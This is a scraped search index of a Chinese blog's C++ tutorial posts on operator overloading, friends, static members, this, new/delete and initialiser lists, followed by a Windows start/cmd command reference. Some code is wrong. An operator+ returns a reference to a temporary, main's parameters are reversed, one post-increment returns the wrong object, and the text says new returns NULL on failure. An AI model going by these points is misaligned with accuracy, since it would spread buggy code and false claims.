C&#123;public: C(); C(int ta,int tb); ~C(); //友元重载左移&lt;&lt;运算符 friend ostream &amp; operator&lt;&lt;(ostream &amp; cout, const C &amp; another); //友元重载左移&gt;&gt;运算符 friend istream &amp; operator&gt;&gt;(istream &amp;cin ,C &amp; another);private: int a; int b;&#125;;//友元重载右移&gt;&gt;运算符istream &amp; operator&gt;&gt;(istream &amp; cin, C &amp; another)&#123; cin &gt;&gt; another.a &gt;&gt; another.b; return cin;&#125;//友元重载左移&lt;&lt;运算符ostream &amp; operator&lt;&lt;(ostream &amp; cout, const C &amp; another)&#123; cout &lt;&lt; another.a &lt;&lt; endl; cout &lt;&lt; another.b &lt;&lt; endl; cout &lt;&lt; \"==================\" &lt;&lt; endl; return cout;&#125;C::C(int ta, int tb)&#123; a = ta; b = tb;&#125;C::C()&#123;&#125;C::~C()&#123;&#125;int main(char *argv[], int argc)&#123; C a(1, 2),b(2,3); C c; cout &lt;&lt; a &lt;&lt; b; cin &gt;&gt; a &gt;&gt; c; cout &lt;&lt; a &lt;&lt; c; return 0;&#125; 只能用友元重载，如果用成员函数重载会出现顺序错误 123456789101112ostream &amp; operator&lt;&lt;(ostream &amp; cout)&#123; cout &lt;&lt; this-&gt;a &lt;&lt; endl; cout &lt;&lt; this-&gt;b &lt;&lt; endl; return cout;&#125;int main()&#123; C a; //用成员重载&lt;&lt;或&gt;&gt; 会出现对象在左边的情况,所以不建议用成员函数来重载&lt;&lt;和&gt;&gt;运算符 a &lt;&lt; cout; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"单目和双目运算符重载","slug":"cpp0033-单目和双目运算符重载","date":"2021-05-11T11:26:00.000Z","updated":"2021-05-11T12:15:05.490Z","comments":true,"path":"2021/05/11/cpp0033-单目和双目运算符重载/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/11/cpp0033-单目和双目运算符重载/","excerpt":"","text":"单目和双目运算符重载 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class A&#123;public: A(); A(int ta, int tb); //A operator+(const A &amp; another); //A &amp; operator+=(const A &amp; another); friend A operator+(A &amp; a1, A &amp; a2); friend A&amp; operator+=(A &amp; a1, A &amp; a2); void print(); ~A();private: int a; int b;&#125;;void A::print() &#123; cout &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; b &lt;&lt; endl; cout &lt;&lt; \"=========================\" &lt;&lt; endl;&#125;//////重载双目操作符//A &amp; A::operator+=(const A &amp; another)//&#123;// a += another.a;// b += another.b;// return *this;//&#125;//A A::operator+(const A &amp; another)//&#123;// return A(a + another.a,b + another.b);//&#125;A::A(int ta, int tb)&#123; a = ta; b = tb;&#125;A::A()&#123; a = 0; b = 0;&#125;A::~A()&#123;&#125;//全局重载运算符函数A operator+(A &amp; a1,A &amp; a2) &#123; return A(a1.a + a2.a ,a1.b + a2.b);&#125;A &amp; operator+=(A &amp; a1, A &amp; a2) &#123; a1.a += a2.a; a1.b += a2.b; return a1;&#125;int main(char *argv[], int argc)&#123; A a1(1, 1), a2(2, 2); A a3 = a1 + a2; a3.print(); a3 += a1; a3.print(); return 0;&#125; 前和后重载 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class A&#123;public: A(); A(int ta, int tb); //A operator+(const A &amp; another); //A &amp; operator+=(const A &amp; another); //前++ A &amp; operator++(); //后++ const A operator++(int); friend A operator+(A &amp; a1, A &amp; a2); friend A&amp; operator+=(A &amp; a1, A &amp; a2); ////前++ //friend A&amp; operator++(A &amp;a1); ////后++ //friend const A operator++(A &amp;a1, int); void print()const; ~A();private: int a; int b;&#125;;//全局友元重载++函数//后++//const A operator++(A &amp; a1, int)//&#123;// A temp(a1.a, a1.b);// a1.a++;// a1.b++;// return a1;//&#125;////前++//A &amp; operator++(A &amp; a1)//&#123;// ++a1.a;// ++a1.b;// return a1;//&#125;//成员重载++运算符函数//前++A &amp; A::operator++()&#123; ++a; ++b; return *this;&#125;//后++const A A::operator++(int)&#123; A temp(a, b); a++; b++; return temp;&#125;void A::print()const &#123; cout &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; b &lt;&lt; endl; cout &lt;&lt; \"=========================\" &lt;&lt; endl;&#125;//////重载双目操作符//A &amp; A::operator+=(const A &amp; another)//&#123;// a += another.a;// b += another.b;// return *this;//&#125;//A A::operator+(const A &amp; another)//&#123;// return A(a + another.a,b + another.b);//&#125;A::A(int ta, int tb)&#123; a = ta; b = tb;&#125;A::A()&#123; a = 0; b = 0;&#125;A::~A()&#123;&#125;//全局重载运算符函数A operator+(A &amp; a1,A &amp; a2) &#123; return A(a1.a + a2.a ,a1.b + a2.b);&#125;A &amp; operator+=(A &amp; a1, A &amp; a2) &#123; a1.a += a2.a; a1.b += a2.b; return a1;&#125;void test1() &#123; A a1(1, 1), a2(2, 2); A a3 = a1 + a2; a3.print(); a3 += a1; a3.print();&#125;void test2() &#123; A a1(1, 1), a2(2, 2); ++++a1; a1.print(); (a1++).print(); a1.print();&#125;int main(char *argv[], int argc)&#123; //test1(); test2(); return 0;&#125; 友元重载前和后函数的区别 1234567891011121314151617181920212223//前++friend A&amp; operator++(A &amp;a1);//后++friend const A operator++(A &amp;a1, int);//后++const A operator++(A &amp; a1, int)&#123; A temp(a1.a, a1.b); a1.a++; a1.b++; return a1;&#125;//前++A &amp; operator++(A &amp; a1)&#123; ++a1.a; ++a1.b; return a1;&#125; 类成员函数重载前和后函数的区别 123456789101112131415161718192021222324前++A &amp; operator++();后++const A operator++(int);//成员重载++运算符函数//前++A &amp; A::operator++()&#123; ++a; ++b; return *this;&#125;//后++const A A::operator++(int)&#123; A temp(a, b); a++; b++; return temp;&#125; 后++是不能连用的,所以返回的是一个常对象","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"操作符重载的规则","slug":"cpp0032-操作符重载的规则","date":"2021-05-11T10:49:30.000Z","updated":"2021-05-11T11:09:36.229Z","comments":true,"path":"2021/05/11/cpp0032-操作符重载的规则/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/11/cpp0032-操作符重载的规则/","excerpt":"","text":"操作符重载的规则 不能重载的运算符只有 4 个:","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"操作符重载的基本语法","slug":"cpp0031-操作符重载的基本语法","date":"2021-05-10T16:24:14.000Z","updated":"2021-05-10T17:02:22.906Z","comments":true,"path":"2021/05/11/cpp0031-操作符重载的基本语法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/11/cpp0031-操作符重载的基本语法/","excerpt":"","text":"操作符重载的基本语法 所谓重载，就是重新赋予新的含义。函数重载就是对一个已有的函数赋 予新的含义，使之实现新功能，因此，一个函数名就可以用来代表不同功能的 函数，也就是”一名多用”。 运算符也可以重载。实际上，我们已经在不知不觉之中使用了运算符重 载。例如，大家都已习惯于用加法运算符”+”对整数、单精度数和双精度数进行 加法运算，如5+8，5.8+3.67等，其实计算机对整数、单精度数和双精度数的 加法操作过程是很不相同的，但由于C++已经对运算符”+”进行了重载，所以就能适用于int,float, double类型的运算。 又如”&lt;&lt;“是C的位运算中的位移运算符（左移），但在输出操作中又是与流对象cout配合使用的流插入运算符，”&gt;&gt;“也是位移运算符(右移），但在输入操作中又是与流对象cin配合使用的流提取运算符。这就是运算符重载(operator overloading)。C系统对”&lt;&lt;“和”&gt;&gt;“进行了重载，用户在不同的场合下 使用它们时，作用是不同的。对”&lt;&lt;“和”&gt;&gt;“的重载处理是放在头文件stream中的。因此，如果要在程序中用”&lt;&lt;“和”&gt;&gt;”作流插入运算符和流提取运算符，必须在本文件模块中包含头文件stream(当然还应当包括”using namespace std“)。 现在要讨论的问题是：用户能否根据自己的需要对C++已提供的运算符进行重载，赋予它们新的含义，使之一名多用. 运算符重载的本质是函数重载。 重载函数的一般格式如下: operator 运算符名称 在一起构成了新的函数名。比如 我们会说,operator+ 重载了运算符+。 友元重载 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class A&#123;public: A(); A(int ta,int tb); ~A(); void print(); //友元重载(全局重载函数) friend const A &amp; operator+(const A &amp;ta1, const A &amp;ta2); int getA() &#123; return a; &#125; int getB() &#123; return b; &#125;private: int a; int b;&#125;;void A::print() &#123; cout &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; b &lt;&lt; endl;&#125;A::A(int ta,int tb) &#123; a = ta; b = tb;&#125;A::A()&#123;&#125;A::~A()&#123;&#125;//友元重载(全局重载函数)const A &amp; operator+(const A &amp;ta1,const A &amp;ta2) &#123; return A(ta1.a + ta2.a,ta1.b + ta2.b);&#125;int main(char *argv[], int argc)&#123; A a1(1,2); A a2(3, 4); A a3 = a1 + a2; //operator+(a1,a2); a3.print(); return 0;&#125; 成员重载 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class A&#123;public: A(); A(int ta, int tb); ~A(); void print(); //成员操作符重载函数 const A operator+(const A &amp; anotherA); int getA() &#123; return a; &#125; int getB() &#123; return b; &#125;private: int a; int b;&#125;;//成员操作符重载函数const A A::operator+(const A &amp; anotherA)&#123; return A(this-&gt;a + anotherA.a, this-&gt;b + anotherA.b);&#125;void A::print() &#123; cout &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; b &lt;&lt; endl;&#125;A::A(int ta, int tb) &#123; a = ta; b = tb;&#125;A::A()&#123;&#125;A::~A()&#123;&#125;int main(char *argv[], int argc)&#123; A a1(1, 2); A a2(3, 4); A a3 = a1 + a2; //a3 = a1.operator+(a2); a3.print(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"友元类和友元的关系性质","slug":"cpp0030-友元类和友元的关系性质","date":"2021-05-10T15:59:59.000Z","updated":"2021-05-10T16:24:38.322Z","comments":true,"path":"2021/05/10/cpp0030-友元类和友元的关系性质/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/10/cpp0030-友元类和友元的关系性质/","excerpt":"","text":"友元类和友元的关系性质 友元类的所有成员函数都是另一个类的友元函数,都可以访问另一个类中 的隐藏信息(包括私有成员和保护成员)。 当希望一个类可以存取另一个类的私有成员时,可以将该类声明为另一类 的友元类。定义友元类的语句格式如下: 经过以上说明后,类 B 的所有成员函数都是类 A 的友元函数,能存取类 A的私有成员和保护成员。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include&lt;iostream&gt;using namespace std;class A&#123;public: A(); ~A(); //友元类,代表类B可以访问类A的私有成员和保护成员 friend class B;private: int a; int b;&#125;;class B&#123;public: B(); ~B(); void printCA(A &amp;a) &#123; cout &lt;&lt; a.a &lt;&lt; endl; cout &lt;&lt; a.b &lt;&lt; endl; &#125;private:&#125;;B::B()&#123;&#125;B::~B()&#123;&#125;A::A()&#123; a = 10; b = 20;&#125;A::~A()&#123;&#125;int main(char *argv[], int argc)&#123; A a1; B b1; b1.printCA(a1); return 0;&#125; 声明位置 友元声明以关键字 friend 开始,它只能出现在类定义中。因为友元不是授 权类的 成员,所以它不受其所在类的声明区域 public private 和 protected 的影 响。通常我们 选择把所有友元声明组织在一起并放在类头之后. 友元的利弊 友元不是类成员,但是它可以访问类中的私有成员。友元的作用在于提高 程序的运 行效率,但是,它破坏了类的封装性和隐藏性,使得非成员函数可以访问 类的私有成员。 不过,类的访问权限确实在某些应用场合显得有些呆板,从而容 忍了友元这一特别语法 现象。 注意事项 (1) 友元关系不能被继承。 (2) 友元关系是单向的,不具有交换性。若类 B 是类 A 的友元,类 A 不一定是类B 的友元,要看在类中是否有相应的声明。 (3) 友元关系不具有传递性。若类 B 是类 A 的友元,类 C 是 B 的友元,类 C 不一定 是类 A 的友元,同样要看类中是否有相应的声明。","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"友元函数","slug":"cpp0029-友元函数","date":"2021-05-10T15:10:16.000Z","updated":"2021-05-10T16:24:46.934Z","comments":true,"path":"2021/05/10/cpp0029-友元函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/10/cpp0029-友元函数/","excerpt":"","text":"友元函数 采用类的机制后实现了数据的隐藏与封装,类的数据成员一般定义为私有成 员,成员函 数一般定义为公有的,依此提供类与外界间的通信接口。但是,有时需 要定义一些函数,这 些函数不是类的一部分,但又需要频繁地访问类的数据成员, 这时可以将这些函数定义为该 函数的友元函数。除了友元函数外,还有友元类, 两者统称为友元。友元的作用是提高了程 序的运行效率(即减少了类型检查和 安全性检查等都需要时间开销),但它破坏了类的封装 性和隐藏性,使得非成员函 数可以访问类的私有成员。 友元可以是一个函数,该函数被称为友元函数;友元也可以是一个类,该类被 称为友元 类。 友元函数是可以直接访问类的私有成员的非成员函数。它是定义在类外 的普通函 数,它不属于任何类,但需要在类的定义中加以声明,声明时只需在友元 的名称前加上 关键字 friend,其格式如下: 一个函数可以是多个类的友元函数,只需要在各个类中分别声明。 全局函数作友元函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include&lt;iostream&gt;using namespace std;class Test&#123;public: Test(); ~Test(); friend int getA(Test &amp; t1); friend int getB(Test &amp; t1);private: int a; int b;&#125;;Test::Test()&#123; a = 10; b = 20;&#125;Test::~Test()&#123;&#125;//通过友元函数访问对象私有成员int getA(Test &amp; t1) &#123; return t1.a;&#125;//通过友元函数访问对象私有成员int getB(Test &amp; t1) &#123; return t1.b;&#125;int main(char *argv[], int argc)&#123; Test t1; cout &lt;&lt; getA(t1) &lt;&lt; endl; cout &lt;&lt; getB(t1) &lt;&lt; endl; return 0;&#125; 类成员函数作友元函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;//前向声明,是一种不完全型声明,即只需提供类名(无需提供类实现)即可。仅可⽤于声明指针和引用。class Student;class Teacher&#123;public: Teacher(); ~Teacher(); void print(Student &amp; s)const;private:&#125;;class Student&#123;public: Student(); ~Student(); //用Teacher类的成员函数做友元 friend void Teacher::print(Student &amp; s)const;private: char name[50]; int xueHao;&#125;;void Teacher::print(Student &amp; s) const&#123; cout &lt;&lt; s.name &lt;&lt; endl; cout &lt;&lt; s.xueHao &lt;&lt; endl;&#125;Teacher::Teacher()&#123;&#125;Teacher::~Teacher()&#123;&#125;Student::Student()&#123; strcpy(name,\"XiaoMing\"); xueHao = 10001;&#125;Student::~Student()&#123;&#125;int main(char *argv[], int argc)&#123; Student s; Teacher t; t.print(s); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"对象返回自身","slug":"cpp0028-对象返回自身","date":"2021-05-10T14:56:25.000Z","updated":"2021-05-10T15:03:26.283Z","comments":true,"path":"2021/05/10/cpp0028-对象返回自身/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/10/cpp0028-对象返回自身/","excerpt":"","text":"对象返回自身 123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;iostream&gt;using namespace std;class Test&#123;public: Test(); ~Test(); const Test &amp; print() const &#123; cout &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; b &lt;&lt; endl; cout &lt;&lt; c &lt;&lt; endl; cout &lt;&lt; \"====================\" &lt;&lt; endl; return *this; //返回自己本身 &#125;private: int a; int b; int c;&#125;;Test::Test()&#123; a = 10; b = 20; c = 30;&#125;Test::~Test()&#123;&#125;int main(char *argv[], int argc)&#123; Test t1; t1.print().print(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"this指针","slug":"cpp0027-this指针","date":"2021-05-10T14:22:10.000Z","updated":"2021-05-10T15:13:00.680Z","comments":true,"path":"2021/05/10/cpp0027-this指针/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/10/cpp0027-this指针/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;cstring&gt;using namespace std;class Student&#123;public: Student(); ~Student(); Student(const char * name,int score); //在成员函数后面加上const代表不能修改成员变量 const char * getName()const; void print()const;private: char * name; int score; int xueHao; static int jXueHao;&#125;;int Student::jXueHao = 10000;//打印类成员void Student::print() const&#123; cout &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; score &lt;&lt; endl; cout &lt;&lt; xueHao &lt;&lt; endl;&#125;//返回nameconst char * Student::getName()const&#123; return this-&gt;name;&#125;Student::Student(const char * name, int score)&#123; int len = strlen(name) + 1; this-&gt;name = new char[len]; strcpy(this-&gt;name, name); this -&gt; score = score; xueHao = jXueHao + 1; jXueHao++;&#125;Student::Student()&#123; name = NULL; xueHao = jXueHao + 1; jXueHao++;&#125;Student::~Student()&#123; if (name != NULL) &#123; delete[] name; name = NULL; &#125;&#125;void test() &#123; Student s1(\"XiaoMing\", 100); s1.print(); cout &lt;&lt; s1.getName() &lt;&lt; endl;&#125;int main(char *argv[], int argc)&#123; test(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"静态成员变量和静态成员函数","slug":"cpp0026-静态成员变量和静态成员函数","date":"2021-05-10T13:51:48.000Z","updated":"2021-05-10T14:21:33.679Z","comments":true,"path":"2021/05/10/cpp0026-静态成员变量和静态成员函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/10/cpp0026-静态成员变量和静态成员函数/","excerpt":"","text":"静态成员变量和静态成员函数 在 C++中,静态成员是属于整个类的而不是某个对象,静态成员变量只存储 一份供 所有对象共用。所以在所有对象中都可以共享它。使用静态成员变量实 现多个对象之间 的数据共享不会破坏隐藏的原则,保证了安全性还可以节省内 存。 类的静态成员,属于类,也属于对象,但终归属于类。 静态成员变量 12345678910111213141516171819202122232425262728293031323334353637#include&lt;iostream&gt;using namespace std;class Box&#123;public: Box(); ~Box(); static int height;private: int lenght; int width;&#125;;//只能在类外初始化int Box::height = 100;Box::Box()&#123;&#125;Box::~Box()&#123;&#125;int main(char *argv[], int argc)&#123; Box b; //访问方式 cout &lt;&lt; b.height &lt;&lt; endl;//用对象访问 cout &lt;&lt; Box::height &lt;&lt; endl;//用类名访问 return 0;&#125; 静态成员函数 12345678910111213141516171819202122232425262728293031323334353637383940414243#include&lt;iostream&gt;using namespace std;class Box&#123;public: Box(); ~Box(); //静态成员函数 static int getHeight() &#123; return height; &#125; static int height;private: int lenght; int width;&#125;;//只能在类外初始化int Box::height = 100;Box::Box()&#123;&#125;Box::~Box()&#123;&#125;int main(char *argv[], int argc)&#123; Box b; //访问方式 cout &lt;&lt; b.height &lt;&lt; endl;//用对象访问 cout &lt;&lt; Box::height &lt;&lt; endl;//用类名访问 cout &lt;&lt; Box::getHeight() &lt;&lt; endl; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"new和delete操作符","slug":"cpp0025-new和delete操作符","date":"2021-05-10T12:08:40.000Z","updated":"2021-05-10T13:35:57.689Z","comments":true,"path":"2021/05/10/cpp0025-new和delete操作符/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/10/cpp0025-new和delete操作符/","excerpt":"","text":"new和delete操作符 在软件开发过程中，常常需要动态地分配和撤销内存空间，例如对动态 链表中结点的插入与删除。在C语言中是利用库函数malloc和free来分配和撤 销内存空间的。C++提供了较简便而功能较强的运算符new和delete来取代 malloc和free函数。 new和delete是运算符，不是函数，因此执行效率高。 用new分配数组空间时不能指定初值。如果由于内存不足等原因而无法正 常分配空间，则new会返回一个空指针NULL，用户可以根据该指针的值判断分 配空间是否成功。 malloc不会调用类的构造函数,而new会调用类的构造函数 free不会调用类的析构函数，而delete会调用类的析构函数 12345678910111213141516171819202122232425262728293031323334353637383940#include&lt;iostream&gt;using namespace std;void test() &#123; //使用new开辟一个int类型变量空间 int * ip = new int; //使用new开辟一个int类型数组空间 int * arrayP = new int[10]; if (ip != NULL) &#123; *ip = 100; cout &lt;&lt; *ip &lt;&lt; endl; //释放ip空间 delete ip; ip = NULL; &#125; if (arrayP != NULL) &#123; for (int i = 0; i &lt; 10; i++) &#123; arrayP[i] = i + 1; cout &lt;&lt; arrayP[i] &lt;&lt; \" \"; &#125; cout &lt;&lt; endl; //释放arrayP数组指针 delete[] arrayP; arrayP = NULL; &#125;&#125;int main(char *argv[], int argc)&#123; test(); return 0;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;cstring&gt;using namespace std;class Student &#123;public: Student()&#123; name = NULL; cout &lt;&lt; \"Student()\" &lt;&lt; endl; &#125; Student(const char *tname,int txueHao,float tscore) &#123; cout &lt;&lt; \"Student(char *tname,int txueHao,float tscore)\" &lt;&lt; endl; const int len = strlen(tname) + 1; name = new char[len]; strcpy(name, tname); xueHao = txueHao; score = tscore; &#125; ~Student() &#123; cout &lt;&lt; \"~Student()\" &lt;&lt; endl; if (name != NULL) &#123; delete [] name; name = NULL; &#125; &#125;private: char * name; int xueHao; float score;&#125;;void test1() &#123; Student *s1 = new Student();//触发无参构造 Student *s2 = new Student(\"XiaoMing\", 123, 100.0f);//触发有参构造 int *ip = new int(10);//new一个int类型存储空间并赋于10; delete s1;//触发析构函数 delete s2;//触发析构函数 delete ip;&#125;int main(char *argv[], int argc)&#123; test1(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"构造函数初始化列表","slug":"cpp0024构造函数初始化列表","date":"2021-05-07T19:16:19.000Z","updated":"2021-05-07T22:29:29.553Z","comments":true,"path":"2021/05/08/cpp0024构造函数初始化列表/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/08/cpp0024构造函数初始化列表/","excerpt":"","text":"构造函数初始化列表 如果我们有一个类成员，它本身是一个类或者是一个结构，而且这个成员它只有一个带参数的构造函数，没有默认构造函数。这时要对这个类成员进行初始化，就必须调用这个类成员的带参数的构造函数，如果没有初始化列表，那么他将无法完成第一步，就会报错。 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;using namespace std;class A&#123;public: A(int a) &#123; m_a = a; &#125;private: int m_a;&#125;;class B&#123;public: B(int b) &#123; m_b = b; &#125;private: int m_b; A obja; //当A的对象是B类的⼀一个成员的时候，在初始化B对象的时候， //⽆无法给B分配空间，因为⽆无法初始化A类对象&#125;; int main(void)&#123; A obja(10); B objb(20);//error, return 0;&#125; 语法: 构造函数名(参数1,...,参数n):本类成员名1(参数1),...,本类成员名n(参数n) 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;using namespace std;class A&#123;public: A(int a) &#123; m_a = a; &#125;private: int m_a;&#125;;class B&#123;public: //先初始化m_b,然后再初始化obja,初始化的顺序要看类的成员声明顺序,先声明谁就先初始化谁 B(int b, A &amp;tempA):m_b(b),obja(tempA) &#123; &#125; B(int b) :m_b(b), obja(100)//调用obja的有参构造函数 &#123; &#125;private: int m_b; A obja;&#125;;int main(void)&#123; A obja(10); B objb(20,obja); B objb2(20); return 0;&#125; 当类成员中含有一个const对象时，或者是一个引用时，他们也必须要通过成员初始化列表进行初始化，因为这两种对象要在声明后马上初始化，而在构造函数中，做的是对他们的赋值，这样是不被允许的。 初始化列表中的初始化顺序,与声明顺序有关,与前后赋值顺序无关。","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"starta-cmd命令","slug":"win001starta-cmd命令","date":"2021-05-06T10:04:05.000Z","updated":"2021-05-06T10:10:08.384Z","comments":true,"path":"2021/05/06/win001starta-cmd命令/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/06/win001starta-cmd命令/","excerpt":"","text":"starta-cmd命令 Start 启动单独的“命令提示符”窗口来运行指定程序或命令。如果在没有参数的情况下使用，start 将打开第二个命令提示符窗口。 语法 start [&quot;title&quot;] [/dPath] [/i] [/min] [/max] [{/separate | /shared}] [{/low | /normal | /high | /realtime | /abovenormal | belownormal}] [/wait] [/b] [FileName] [parameters] 参数 “title” 指定在“命令提示符”窗口标题栏中显示的标题。 /dpatch 指定启动目录。 /i 将 Cmd.exe 启动环境传送到新的“命令提示符”窗口。 /min 启动新的最小化窗口。 /max 启动新的最大化窗口。 /separate 在单独的内存空间启动 16 位程序。 /shared 在共享的内存空间启动 16 位程序。 /low 以空闲优先级启动应用程序。 /normal 以一般优先级启动应用程序。 /high 以高优先级启动应用程序。 /realtime 以实时优先级启动应用程序。 /abovenormal 以超出常规优先级的方式启动应用程序。 /belownormal 以低出常规优先级的方式启动应用程序。 /wait 启动应用程序，并等待其结束。 /b 启动应用程序时不必打开新的“命令提示符”窗口。除非应用程序启用 CTRL+C，否则将忽略 CTRL+C 操作。使用 CTRL+BREAK 中断应用程序。 非执行文件只要将文件名作为命令键入，即可通过其文件关联运行该文件。有关使用 assoc 和 ftype 在命令脚本中创建这些关联的详细信息，请参阅“”。 在运行的命令的第一个标记为“CMD”字符串但不包括扩展名或路径限定符时，“CMD”将被 COMSPEC 变量的值取代。这样可以防止用户从当前目录选取 cmd。 当您运行 32 位图形用户界面 (GUI) 应用程序时，cmd 不会在返回到命令提示符之前等待应用程序退出。如果从命令脚本运行应用程序，则不会发生这种新情况。在运行的命令中第一个符号不包括扩展名的情况下，Cmd.exe 使用 PATHEXT 环境变量的值确定要查找的扩展名以及查找顺序。PATHEXT 变量的默认值为：COM;.EXE;.BAT;.CMD（语法与 PATH 变量相同，使用分号分开不同元素）。当您搜索可执行文件且在任何扩展名上都没有匹配项时，start 将搜索目录名。 具体例子： 说明：如果你所在程序的路径中带有空格，那么必须用“”把路径括起来，否则系统会提示找不到XX文件，另外，在运行某些程序时，需在路径的前面加一对空白的“”，表示创建一个空白的窗口，它指向的程序是XXXXXXXX。还有就是别忘了空格。 当我想运行位于“D:/draw/”的“photoshop.exe”使，应该使用以下命令： start “”“D:/draw/photoshop.exe” 表示以常规窗口运行程序 如果想让程序以最大化窗口运行，则使用以下命令： start /max“”“D:/draw/photoshop.exe” 表示以最大化窗口运行程序 最小化这是这样： start /min “” “D:/draw/photoshop.exe” 表示以最小化窗口运行程序 等待某个程序允许完毕，也就是窗口关闭后，再打开下一个程序这可以这样： start /w “” “D:/draw/photoshop.exe” start “” cmd.exe CMD cmd /c dir 是执行完dir命令后关闭命令窗口。 cmd /k dir 是执行完dir命令后不关闭命令窗口。 cmd /c start dir 会打开一个新窗口后执行dir指令，原窗口会关闭。 cmd /k start dir 会打开一个新窗口后执行dir指令，原窗口不会关闭。 gpedit.msc-----组策略 sndrec32-------录音机 Nslookup-------IP地址侦测器 explorer-------打开资源管理器 logoff---------注销命令 tsshutdn-------60秒倒计时关机命令 lusrmgr.msc----本机用户和组 services.msc—本地服务设置 oobe/msoobe /a----检查XP是否激活 notepad--------打开记事本 cleanmgr-------垃圾整理 net start messenger----开始信使服务 compmgmt.msc—计算机管理 net stop messenger-----停止信使服务 conf-----------启动netmeeting dvdplay--------DVD播放器 charmap--------启动字符映射表 diskmgmt.msc—磁盘管理实用程序 calc-----------启动计算器 dfrg.msc-------磁盘碎片整理程序 chkdsk.exe-----Chkdsk磁盘检查 devmgmt.msc— 设备管理器 regsvr32 /u *.dll----停止dll文件运行 drwtsn32------ 系统医生 rononce -p ----15秒关机 dxdiag---------检查DirectX信息 regedt32-------注册表编辑器 Msconfig.exe—系统配置实用程序 rsop.msc-------组策略结果集 mem.exe--------显示内存使用情况 regedit.exe----注册表 winchat--------XP自带局域网聊天 progman--------程序管理器 winmsd---------系统信息 perfmon.msc----计算机性能监测程序 winver---------检查Windows版本 sfc /scannow-----扫描错误并复原 taskmgr-----任务管理器（2000／xp／2003 winver---------检查Windows版本 wmimgmt.msc----打开windows管理体系结构(WMI) wupdmgr--------windows更新程序 wscript--------windows脚本宿主设置 write----------写字板 winmsd---------系统信息 wiaacmgr-------扫描仪和照相机向导 winchat--------XP自带局域网聊天 mem.exe--------显示内存使用情况 Msconfig.exe—系统配置实用程序 mplayer2-------简易widnows media player mspaint--------画图板 mstsc----------远程桌面连接 mplayer2-------媒体播放机 magnify--------放大镜实用程序 mmc------------打开控制台 mobsync--------同步命令 dxdiag---------检查DirectX信息 drwtsn32------ 系统医生 devmgmt.msc— 设备管理器 dfrg.msc-------磁盘碎片整理程序 diskmgmt.msc—磁盘管理实用程序 dcomcnfg-------打开系统组件服务 ddeshare-------打开DDE共享设置 dvdplay--------DVD播放器 net stop messenger-----停止信使服务 net start messenger----开始信使服务 notepad--------打开记事本 nslookup-------网络管理的工具向导 ntbackup-------系统备份和还原 narrator-------屏幕“讲述人” ntmsmgr.msc----移动存储管理器 ntmsoprq.msc—移动存储管理员操作请求 netstat -an----(TC)命令检查接口 syncapp--------创建一个公文包 sysedit--------系统配置编辑器 sigverif-------文件签名验证程序 sndrec32-------录音机 